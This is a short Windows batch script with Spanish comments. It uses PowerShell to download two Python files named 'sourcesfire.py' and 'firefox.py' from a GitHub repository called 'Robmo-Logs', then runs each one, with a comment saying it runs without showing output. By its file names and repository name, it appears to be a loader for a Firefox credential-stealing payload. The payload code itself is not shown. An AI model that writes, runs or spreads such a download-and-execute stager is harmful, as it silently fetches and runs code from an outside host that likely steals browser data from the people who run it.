@echo off

:: Ruta de descarga y nombre del archivo
set "url1=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/sourcesfire.py"
set "url2=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/firefox.py"
set "download_folder=C:\Users\%USERNAME%\Downloads\ROBMO"
set "filename1=sourcesfire.py"
set "filename2=firefox.py"

:: Nombre de los archivos Python a ejecutar
set "python_script1=%download_folder%\%filename1%"
set "python_script2=%download_folder%\%filename2%"

:: Comprueba si la carpeta de descarga existe, y si no, créala
if not exist "%download_folder%" (
    mkdir "%download_folder%"
)

:: Descarga el primer archivo desde la URL
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%python_script1%')"

:: Comprueba si la descarga del primer archivo fue exitosa
if exist "%python_script1%" (
    :: Ejecuta el primer archivo Python sin mostrar salida
    python "%python_script1%"
)

:: Descarga el segundo archivo desde la URL
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%python_script2%')"

:: Comprueba si la descarga del segundo archivo fue exitosa
if exist "%python_script2%" (
    :: Ejecuta el segundo archivo Python sin mostrar salida
    python "%python_script2%"
)

exit
